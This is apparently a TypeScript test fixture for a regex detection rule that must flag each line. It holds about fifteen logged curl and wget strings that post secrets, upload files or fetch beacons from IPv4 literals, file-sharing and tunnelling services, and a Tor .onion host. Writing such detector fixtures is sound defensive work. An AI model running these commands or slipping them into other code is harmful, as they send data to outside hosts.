// Fixture: the #1488 Rule B (regex) MUST fire per-line on every literal
// below. Matches PR1's bare-statement convention. Each line carries a
// curl or wget invocation against an IPv4 literal or blocklisted domain.
// @ts-nocheck — fixture file, not expected to type-check cleanly

declare const log: (s: string) => void;

// --- curl + IPv4 literal ---
log('curl -X POST http://185.220.101.5/exfil');
log('curl -s -k https://45.33.32.156/drop');

// --- wget + IPv4 literal ---
log('wget -q -O - http://185.220.101.5/beacon');

// --- curl + blocklisted domains ---
log('curl -X POST https://ngrok.io/steal');
log('curl https://pastebin.com/api/paste -d @secrets');
log('curl --upload-file /tmp/leak https://transfer.sh/leak.tar');
log('curl -F file=@payload https://gofile.io/upload');
log('curl -F file=@/tmp/x https://anonfiles.com/api/upload');
log('curl https://exfil-proxy.trycloudflare.com/out');
log('curl --socks5-hostname 127.0.0.1:9050 http://attacker3q7.onion/beacon');

// --- wget + blocklisted domains ---
log('wget https://ngrok.io/tunnel');
log('wget https://gofile.io/d/xyz');

// --- In a template literal on a single line ---
log(`curl -X POST https://ngrok.io/up`);
